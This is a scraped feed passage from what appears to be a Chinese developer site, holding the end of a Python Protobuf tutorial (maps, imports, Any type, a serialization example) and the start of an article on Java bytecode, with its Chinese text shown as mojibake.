<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ’å…¥åæ ‡ç­¾:"</span>, user.tags)  <span class="hljs-comment"># ['æŠ€æœ¯', 'Python', 'åˆ†äº«', 'å­¦ä¹ ']</span>

<span class="hljs-comment"># åˆ é™¤å…ƒç´ </span>
<span class="hljs-keyword">del</span> user.tags[<span class="hljs-number">2</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åˆ é™¤åæ ‡ç­¾:"</span>, user.tags)  <span class="hljs-comment"># ['æŠ€æœ¯', 'Python', 'å­¦ä¹ ']</span>

<span class="hljs-comment"># éå†é‡å¤å­—æ®µ</span>
<span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> user.tags:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ ‡ç­¾:"</span>, tag)
</code></pre>
<h3 data-id="heading-25">7. æ˜ å°„å­—æ®µï¼ˆMapFieldï¼‰é«˜çº§æ“ä½œ</h3>
<p>æ˜ å°„å­—æ®µæœ¬è´¨æ˜¯ <code>MapField</code> ç±»å‹ï¼ˆç»§æ‰¿è‡ª Python dictï¼‰ï¼Œæ”¯æŒ dict æ‰€æœ‰æ“ä½œï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># éå†æ˜ å°„å­—æ®µ</span>
<span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> user.ext_info.items():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ‰©å±•ä¿¡æ¯ <span class="hljs-subst">{key}</span>: <span class="hljs-subst">{value}</span>"</span>)

<span class="hljs-comment"># åˆ é™¤æ˜ å°„å­—æ®µå…ƒç´ </span>
<span class="hljs-keyword">del</span> user.ext_info[<span class="hljs-string">"age"</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åˆ é™¤åæ‰©å±•ä¿¡æ¯:"</span>, <span class="hljs-built_in">dict</span>(user.ext_info))  <span class="hljs-comment"># {'phone': '13800138000'}</span>

<span class="hljs-comment"># æ¸…ç©ºæ˜ å°„å­—æ®µ</span>
user.ext_info.clear()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¸…ç©ºåæ‰©å±•ä¿¡æ¯:"</span>, <span class="hljs-built_in">dict</span>(user.ext_info))  <span class="hljs-comment"># {}</span>

<span class="hljs-comment"># æ‰¹é‡æ·»åŠ æ˜ å°„å­—æ®µ</span>
user.ext_info.update({<span class="hljs-string">"job"</span>: <span class="hljs-string">"å·¥ç¨‹å¸ˆ"</span>, <span class="hljs-string">"salary"</span>: <span class="hljs-string">"30k"</span>})
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰¹é‡æ·»åŠ åæ‰©å±•ä¿¡æ¯:"</span>, <span class="hljs-built_in">dict</span>(user.ext_info))  <span class="hljs-comment"># {'job': 'å·¥ç¨‹å¸ˆ', 'salary': '30k'}</span>
</code></pre>
<h3 data-id="heading-26">8. å¯¼å…¥å…¶ä»– Proto æ–‡ä»¶ï¼ˆè·¨æ–‡ä»¶å¤ç”¨ï¼‰</h3>
<p>å¦‚æœæ¶ˆæ¯ç»“æ„éœ€è¦å¤ç”¨å…¶ä»– <code>.proto</code> æ–‡ä»¶çš„å®šä¹‰ï¼Œå¯é€šè¿‡ <code>import</code> å®ç°ï¼š</p>
<h4 data-id="heading-27">ç¤ºä¾‹ï¼šå¯¼å…¥å…¬å…±æšä¸¾ï¼ˆcommon.proto + order.protoï¼‰</h4>
<pre><code class="hljs language-proto" lang="proto">// common.proto
syntax = "proto3";
package common;

enum OrderStatus {
    ORDER_UNKNOWN = 0;
    ORDER_PAID = 1;
    ORDER_SHIPPED = 2;
    ORDER_FINISHED = 3;
}
</code></pre>
<pre><code class="hljs language-proto" lang="proto">// order.proto
syntax = "proto3";
package order;

// å¯¼å…¥å…¶ä»–protoæ–‡ä»¶
import "common.proto";

message Order {
    int64 order_id = 1;
    int64 user_id = 2;
    float amount = 3;
    common.OrderStatus status = 4;  // ä½¿ç”¨å¯¼å…¥çš„æšä¸¾
}
</code></pre>
<p>ç¼–è¯‘å‘½ä»¤ï¼ˆéœ€æŒ‡å®šå¯¼å…¥è·¯å¾„ <code>--proto_path</code>ï¼Œç®€ç§° <code>-I</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">protoc --python_out=./gen -I=./ ./common.proto ./order.proto
</code></pre>
<p>Python ä¸­ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> gen.order_pb2 <span class="hljs-keyword">import</span> Order
<span class="hljs-keyword">from</span> gen.common_pb2 <span class="hljs-keyword">import</span> OrderStatus

order = Order(
    order_id=<span class="hljs-number">2001</span>,
    user_id=<span class="hljs-number">1001</span>,
    amount=<span class="hljs-number">299.9</span>,
    status=OrderStatus.ORDER_PAID
)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"è®¢å•çŠ¶æ€:"</span>, OrderStatus.Name(order.status))  <span class="hljs-comment"># ORDER_PAID</span>
</code></pre>
<h3 data-id="heading-28">9. Any ç±»å‹ï¼ˆåŠ¨æ€æ¶ˆæ¯ï¼Œproto3 ç‰¹æœ‰ï¼‰</h3>
<p><code>Any</code> ç±»å‹å…è®¸åœ¨æ¶ˆæ¯ä¸­åµŒå…¥ä»»æ„å…¶ä»–æ¶ˆæ¯ç±»å‹ï¼ˆæ— éœ€æå‰å®šä¹‰ï¼‰ï¼Œé€‚ç”¨äºåŠ¨æ€æ•°æ®åœºæ™¯ï¼š</p>
<h4 data-id="heading-29">å®šä¹‰å« Any ç±»å‹çš„æ¶ˆæ¯ï¼ˆdynamic.protoï¼‰</h4>
<pre><code class="hljs language-proto" lang="proto">syntax = "proto3";
package dynamic;

import "google/protobuf/any.proto";  // å¯¼å…¥Anyç±»å‹

message DynamicData {
    string type = 1;  // æ¶ˆæ¯ç±»å‹æ ‡è¯†
    google.protobuf.Any data = 2;  // ä»»æ„æ¶ˆæ¯ç±»å‹
}
</code></pre>
<p>ç¼–è¯‘å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">protoc --python_out=./gen -I=./ -I=/usr/local/include ./dynamic.proto  <span class="hljs-comment"># -I æŒ‡å®šgoogle/protobufè·¯å¾„</span>
</code></pre>
<p>Python ä¸­ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> gen.dynamic_pb2 <span class="hljs-keyword">import</span> DynamicData
<span class="hljs-keyword">from</span> gen.user_pb2 <span class="hljs-keyword">import</span> User
<span class="hljs-keyword">from</span> gen.order_pb2 <span class="hljs-keyword">import</span> Order
<span class="hljs-keyword">from</span> google.protobuf.any_pb2 <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span>

<span class="hljs-comment"># 1. åˆ›å»ºUseræ¶ˆæ¯å¹¶å°è£…åˆ°Any</span>
user = User(<span class="hljs-built_in">id</span>=<span class="hljs-number">1001</span>, name=<span class="hljs-string">"å¼ ä¸‰"</span>)
any_user = <span class="hljs-type">Any</span>()
any_user.Pack(user)  <span class="hljs-comment"># æ‰“åŒ…Useræ¶ˆæ¯åˆ°Any</span>

<span class="hljs-comment"># 2. åˆ›å»ºDynamicDataæ¶ˆæ¯</span>
dynamic_data = DynamicData(
    <span class="hljs-built_in">type</span>=<span class="hljs-string">"user"</span>,
    data=any_user
)

<span class="hljs-comment"># 3. ååºåˆ—åŒ–Anyä¸­çš„æ¶ˆæ¯</span>
<span class="hljs-keyword">if</span> dynamic_data.data.Is(User.DESCRIPTOR):  <span class="hljs-comment"># åˆ¤æ–­Anyä¸­çš„æ¶ˆæ¯ç±»å‹</span>
    unpacked_user = User()
    dynamic_data.data.Unpack(unpacked_user)  <span class="hljs-comment"># è§£åŒ…</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è§£åŒ…åçš„ç”¨æˆ·å:"</span>, unpacked_user.name)  <span class="hljs-comment"># å¼ ä¸‰</span>

<span class="hljs-comment"># 4. å°è£…Orderæ¶ˆæ¯åˆ°Any</span>
order = Order(order_id=<span class="hljs-number">2001</span>, amount=<span class="hljs-number">299.9</span>)
any_order = <span class="hljs-type">Any</span>()
any_order.Pack(order)

dynamic_data.<span class="hljs-built_in">type</span> = <span class="hljs-string">"order"</span>
dynamic_data.data = any_order

<span class="hljs-keyword">if</span> dynamic_data.data.Is(Order.DESCRIPTOR):
    unpacked_order = Order()
    dynamic_data.data.Unpack(unpacked_order)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è§£åŒ…åçš„è®¢å•ID:"</span>, unpacked_order.order_id)  <span class="hljs-comment"># 2001</span>
</code></pre>
<h2 data-id="heading-30">äº”ã€å®æˆ˜æ¡ˆä¾‹ï¼šç”¨æˆ·æ•°æ®åºåˆ—åŒ–ä¼ è¾“</h2>
<p>æ¨¡æ‹Ÿä¸€ä¸ªåœºæ™¯ï¼šæœåŠ¡ç«¯å°†ç”¨æˆ·æ•°æ®åºåˆ—åŒ–ä¸º Protobuf å­—èŠ‚æµï¼Œå®¢æˆ·ç«¯æ¥æ”¶åååºåˆ—åŒ–ï¼Œä¿®æ”¹æ•°æ®åå†åºåˆ—åŒ–ä¸º JSON ä¿å­˜ã€‚</p>
<h3 data-id="heading-31">æœåŠ¡ç«¯ä»£ç ï¼ˆserver.pyï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sys
sys.path.append(<span class="hljs-string">"./gen"</span>)

<span class="hljs-keyword">from</span> user_pb2 <span class="hljs-keyword">import</span> User, Address, UserStatus
<span class="hljs-keyword">from</span> google.protobuf.json_format <span class="hljs-keyword">import</span> MessageToJson

<span class="hljs-comment"># 1. æ„å»ºç”¨æˆ·æ•°æ®</span>
addr = Address(province=<span class="hljs-string">"æµ™æ±Ÿçœ"</span>, city=<span class="hljs-string">"æ­å·å¸‚"</span>, detail=<span class="hljs-string">"è¥¿æ¹–è·¯10å·"</span>)
user = User(
    <span class="hljs-built_in">id</span>=<span class="hljs-number">1005</span>,
    name=<span class="hljs-string">"å°æ˜"</span>,
    score=<span class="hljs-number">95.0</span>,
    is_vip=<span class="hljs-literal">True</span>,
    status=UserStatus.STATUS_ACTIVE,
    address=addr,
    tags=[<span class="hljs-string">"å­¦ç”Ÿ"</span>, <span class="hljs-string">"ç«èµ›é€‰æ‰‹"</span>],
    ext_info={<span class="hljs-string">"grade"</span>: <span class="hljs-string">"é«˜ä¸‰"</span>, <span class="hljs-string">"school"</span>: <span class="hljs-string">"æ­å·ä¸€ä¸­"</span>}
)

<span class="hljs-comment"># 2. åºåˆ—åŒ–ä¸ºå­—èŠ‚æµï¼ˆæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“ï¼‰</span>
user_bytes = user.SerializeToString()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æœåŠ¡ç«¯åºåˆ—åŒ–å­—èŠ‚æµé•¿åº¦: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(user_bytes)}</span>"</span>)

<span class="hljs-comment"># 3. å°†å­—èŠ‚æµå†™å…¥æ–‡ä»¶ï¼ˆæ¨¡æ‹Ÿä¼ è¾“ï¼‰</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"user_data.bin"</span>, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
    f.write(user_bytes)
</code></pre>
<h3 data-id="heading-32">å®¢æˆ·ç«¯ä»£ç ï¼ˆclient.pyï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sys
sys.path.append(<span class="hljs-string">"./gen"</span>)

<span class="hljs-keyword">from</span> user_pb2 <span class="hljs-keyword">import</span> User
<span class="hljs-keyword">from</span> google.protobuf.json_format <span class="hljs-keyword">import</span> MessageToJson

<span class="hljs-comment"># 1. è¯»å–å­—èŠ‚æµï¼ˆæ¨¡æ‹Ÿæ¥æ”¶ï¼‰</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"user_data.bin"</span>, <span class="hljs-string">"rb"</span>) <span class="hljs-keyword">as</span> f:
    user_bytes = f.read()

<span class="hljs-comment"># 2. ååºåˆ—åŒ–</span>
user = User()
user.ParseFromString(user_bytes)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å®¢æˆ·ç«¯ååºåˆ—åŒ–åç”¨æˆ·ä¿¡æ¯:"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ID: <span class="hljs-subst">{user.<span class="hljs-built_in">id</span>}</span>, å§“å: <span class="hljs-subst">{user.name}</span>, åœ°å€: <span class="hljs-subst">{user.address.city}</span>"</span>)

<span class="hljs-comment"># 3. ä¿®æ”¹æ•°æ®</span>
user.score = <span class="hljs-number">98.0</span>
user.tags.append(<span class="hljs-string">"ä¼˜ç§€å­¦ç”Ÿ"</span>)
user.ext_info[<span class="hljs-string">"rank"</span>] = <span class="hljs-string">"å¹´çº§å‰10"</span>

<span class="hljs-comment"># 4. è½¬æ¢ä¸ºJSONä¿å­˜</span>
user_json = MessageToJson(user, preserving_proto_field_name=<span class="hljs-literal">True</span>, indent=<span class="hljs-number">2</span>)
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"user_data.json"</span>, <span class="hljs-string">"w"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:
    f.write(user_json)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å®¢æˆ·ç«¯å·²å°†ä¿®æ”¹åçš„æ•°æ®ä¿å­˜ä¸ºJSON"</span>)
</code></pre>
<p>è¿è¡Œæµç¨‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python server.py
python client.py
</code></pre>
<p>è¾“å‡ºç»“æœï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">æœåŠ¡ç«¯åºåˆ—åŒ–å­—èŠ‚æµé•¿åº¦: 89</span>
<span class="hljs-section">å®¢æˆ·ç«¯ååºåˆ—åŒ–åç”¨æˆ·ä¿¡æ¯:</span>
<span class="hljs-section">ID: 1005, å§“å: å°æ˜, åœ°å€: æ­å·å¸‚</span>
å®¢æˆ·ç«¯å·²å°†ä¿®æ”¹åçš„æ•°æ®ä¿å­˜ä¸ºJSON
</code></pre>
<h2 data-id="heading-33">å…­ã€å¸¸è§é—®é¢˜ä¸æ³¨æ„äº‹é¡¹</h2>
<ol>
<li><strong>ç‰ˆæœ¬å…¼å®¹</strong>ï¼š<code>protoc</code> ç‰ˆæœ¬éœ€ä¸ <code>protobuf</code> åº“ç‰ˆæœ¬åŒ¹é…ï¼ˆå¦‚ protoc 25.x å¯¹åº” protobuf 4.25.xï¼‰ï¼Œå¦åˆ™å¯èƒ½ç¼–è¯‘/è¿è¡ŒæŠ¥é”™ã€‚</li>
<li><strong>å­—æ®µç¼–å·</strong>ï¼šä¸€æ—¦å‘å¸ƒï¼Œå­—æ®µç¼–å·ä¸å¯ä¿®æ”¹ï¼ˆå¦åˆ™ååºåˆ—åŒ–ä¼šå‡ºé”™ï¼‰ï¼Œæ–°å¢å­—æ®µä½¿ç”¨æ–°ç¼–å·å³å¯ã€‚</li>
<li><strong>é»˜è®¤å€¼</strong>ï¼šproto3 æœªèµ‹å€¼çš„å­—æ®µä¼šè¿”å›é»˜è®¤å€¼ï¼ˆint=0ã€string=""ã€bool=Falseã€æšä¸¾=0ï¼‰ï¼Œæ— éœ€åˆ¤ç©ºã€‚</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼š
<ul>
<li>é«˜é¢‘å­—æ®µä½¿ç”¨ 1-15 çš„ç¼–å·ï¼ˆèŠ‚çœå­—èŠ‚ï¼‰ã€‚</li>
<li>åºåˆ—åŒ–ä¼˜å…ˆä½¿ç”¨ <code>SerializeToString()</code>ï¼ˆå¸¦æ ¡éªŒï¼‰ï¼Œæ€§èƒ½è¦æ±‚æé«˜æ—¶ç”¨ <code>SerializePartialToString()</code>ã€‚</li>
</ul>
</li>
<li><strong>è·¨è¯­è¨€å…¼å®¹</strong>ï¼šç¡®ä¿ä¸åŒè¯­è¨€çš„ Protobuf ç‰ˆæœ¬ä¸€è‡´ï¼Œå­—æ®µç±»å‹æ˜ å°„æ­£ç¡®ï¼ˆå¦‚ Python int64 å¯¹åº” Java longï¼‰ã€‚</li>
</ol>
<h2 data-id="heading-34">ä¸ƒã€æ€»ç»“</h2>
<p>æœ¬æ–‡è¦†ç›–äº† Python Protobuf çš„æ ¸å¿ƒ APIï¼š</p>
<ul>
<li>ç¯å¢ƒæ­å»ºä¸ Proto æ–‡ä»¶ç¼–è¯‘ï¼›</li>
<li>æ¶ˆæ¯å®ä¾‹çš„åˆ›å»ºã€å­—æ®µèµ‹å€¼ä¸è®¿é—®ï¼›</li>
<li>åºåˆ—åŒ–/ååºåˆ—åŒ–ï¼ˆæ ¸å¿ƒåŠŸèƒ½ï¼‰ï¼›</li>
<li>æ¶ˆæ¯ä¸å­—å…¸/JSON äº’è½¬ï¼›</li>
<li>é‡å¤å­—æ®µã€æ˜ å°„å­—æ®µã€æšä¸¾ã€åµŒå¥—æ¶ˆæ¯ã€Any ç±»å‹çš„ä½¿ç”¨ï¼›</li>
<li>è·¨æ–‡ä»¶å¯¼å…¥ä¸å®æˆ˜æ¡ˆä¾‹ã€‚</li>
</ul>
<p>Protobuf ç›¸æ¯” JSON/XML å…·æœ‰æ›´é«˜çš„åºåˆ—åŒ–æ•ˆç‡ã€æ›´å°çš„å­—èŠ‚ä½“ç§¯ï¼Œæ˜¯å¾®æœåŠ¡ã€å¤§æ•°æ®ä¼ è¾“åœºæ™¯çš„é¦–é€‰ï¼ŒæŒæ¡ä¸Šè¿° API å³å¯æ»¡è¶³ç»å¤§å¤šæ•° Python å¼€å‘éœ€æ±‚ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å­¦ç‚¹javaå­—èŠ‚ç æ›´æ˜“äºç†è§£ä¸€äº›ç‰¹æ®Šçš„javaè¯­æ³•æ•ˆæœ]]></title>    <link>https://juejin.cn/post/7582791876367220774</link>    <guid>https://juejin.cn/post/7582791876367220774</guid>    <pubDate>2025-12-12T17:45:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582791876367220774" data-draft-id="7582814236583428134" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å­¦ç‚¹javaå­—èŠ‚ç æ›´æ˜“äºç†è§£ä¸€äº›ç‰¹æ®Šçš„javaè¯­æ³•æ•ˆæœ"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2025-12-12T17:45:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç æ— ç–†"/> <meta itemprop="url" content="https://juejin.cn/user/1039488983238903"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å­¦ç‚¹javaå­—èŠ‚ç æ›´æ˜“äºç†è§£ä¸€äº›ç‰¹æ®Šçš„javaè¯­æ³•æ•ˆæœ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1039488983238903/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç æ— ç–†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T17:45:29.000Z" title="Fri Dec 12 2025 17:45:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¾ˆå¤šäººå­¦ä¹ javaä¸ä¼šå»ç†è§£å­—èŠ‚ç æŒ‡ä»¤ï¼Œè§‰å¾—èƒ½çœ‹æ‡‚å­—èŠ‚ç å¯¹å†™å¥½javaä»£ç æ²¡ä»€ä¹ˆå¸®åŠ©ï¼Œä½†å…¶å®ä¸ç„¶ï¼Œä¸å°‘javaè¯­æ³•æ•ˆæœå…¶å®å¯ä»¥é€šè¿‡å­—èŠ‚ç æ¥ç†è§£çš„ï¼Œæ€å¼€å­—èŠ‚ç çš„é¢çº±èƒ½æ›´å¥½çš„ç†è§£javaä»£ç çš„è¯­æ³•å’Œå®é™…æ‰§è¡Œç»“æœä¹‹é—´çš„å…³ç³»ï¼Œçœ‹äº†æœ¬æ–‡ä¼šè®©ä½ æœ‰ä¸€ç§å­—èŠ‚ç ä¹Ÿä¸è¿‡å¦‚æ­¤çš„æ„Ÿè§‰ã€‚</p>
<h2 data-id="heading-0">åå­—è§£é‡Š</h2>
<p>ç”±äºæœ¬æ–‡æ¶‰åŠjavaå­—èŠ‚ç æŒ‡ä»¤ï¼Œå¦‚æœæœ‰ä¸€ç‚¹è®¡ç®—æœºæ ˆå’Œå †çš„åŸºæœ¬è®¤çŸ¥ä¼šæ›´å¥½ç†è§£ï¼Œä¸æ¸…æ¥šè¯¥çŸ¥è¯†ç‚¹ä¹Ÿèƒ½å¤§æ¦‚æ„ä¼šï¼Œä¸å½±å“å¤§å®¶ç†è§£å…¶å¤§è‡´çš„åŸç†ã€‚è¿™é‡Œç®€å•ä»‹ç»ä¸‹æœ¬æ–‡æ¶‰åŠçš„å‡ ä¸ªå¸¸è§çš„æŒ‡ä»¤ï¼Œä»¥ä¾¿æ›´æ–¹ä¾¿çš„é˜…è¯»ã€‚</p>






































































<table><thead><tr><th>æŒ‡ä»¤ä¸­åå¤å‡ºç°å­—ç¬¦</th><th>å«ä¹‰</th><th>ä¸¾ä¾‹</th></tr></thead><tbody><tr><td><code>a</code></td><td>å¯¹å¼•ç”¨æ“ä½œ</td><td><code>aload_1</code>ï¼šè¯»å–æ ˆé¡¶ä¸€ä¸ª32bå¤§å°çš„å¼•ç”¨</td></tr><tr><td><code>i</code></td><td>å¯¹æ ˆä¸Šinté•¿åº¦çš„ç©ºé—´è¿›è¡Œæ“ä½œ</td><td><code>iload_1</code>ï¼šè¯»å–æ ˆé¡¶ä¸€ä¸ª32bå¤§å°çš„intå€¼ <code>istore_1</code>ï¼šæŠŠä¸€ä¸ªintå€¼èµ‹å€¼ç»™æ ˆé¡¶çš„intå˜é‡</td></tr><tr><td><code>l</code></td><td>å¯¹æ ˆä¸Šlongé•¿åº¦çš„ç©ºé—´è¿›è¡Œæ“ä½œ</td><td><code>lload_2</code>ï¼šè¯»å–æ ˆé¡¶ä¸€ä¸ªlongé•¿åº¦ï¼ˆ2ä¸ª32bå¤§å°ï¼‰çš„longå€¼ <code>lstore_2</code>ï¼šæŠŠä¸€ä¸ªlongå€¼èµ‹å€¼ç»™æ ˆé¡¶longé•¿åº¦ï¼ˆ2ä¸ª32bå¤§å°ï¼‰çš„å˜é‡</td></tr><tr><td><code>store</code></td><td>æŠŠæŸä¸ªå€¼èµ‹å€¼ç»™æ ˆé¡¶çš„å˜é‡</td><td>å‚è€ƒ<code>astore_1</code>ã€<code>istore_1</code>ã€<code>lstore_2</code></td></tr><tr><td><code>load</code></td><td>è¯»å–æ ˆé¡¶çš„å€¼</td><td>å‚è€ƒ<code>aload_1</code>ã€<code>iload_1</code>ã€<code>lload_2</code></td></tr><tr><td><code>eq</code></td><td>æ˜¯å¦ç­‰äº1ï¼ˆå°äºä¸º-1ï¼Œç­‰äºä¸º0ï¼Œå¤§äºä¸º1ï¼Œfalseä¸º0ï¼Œtrueä¸º1ï¼‰</td><td><code>ifeq 